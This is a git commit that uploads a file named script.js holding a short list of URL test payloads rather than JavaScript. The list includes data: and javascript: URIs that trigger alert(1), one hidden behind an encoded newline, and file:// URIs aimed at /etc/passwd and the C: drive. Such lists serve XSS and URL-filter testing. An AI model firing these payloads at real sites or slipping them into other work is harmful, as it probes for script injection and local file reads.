9a2d29f6bb0f96b69d9c6fe4a85979d80d787f48
sendinc98-svg <sendinc98@gmail.com>
2025-08-18 13:27:31 +0300

    Add files via upload

---
+++ script.js
@@ -0,0 +1,8 @@
+http://www.google.de/
+data:text/html,%3cscript%3ealert(1)%3c/script%3e
+javascript://%0aalert(1)//
+javascript:alert(1)//
+file://localhost/C:/
+file:///etc/passwd/
+file://localhost/etc/passwd/
+file://C:/
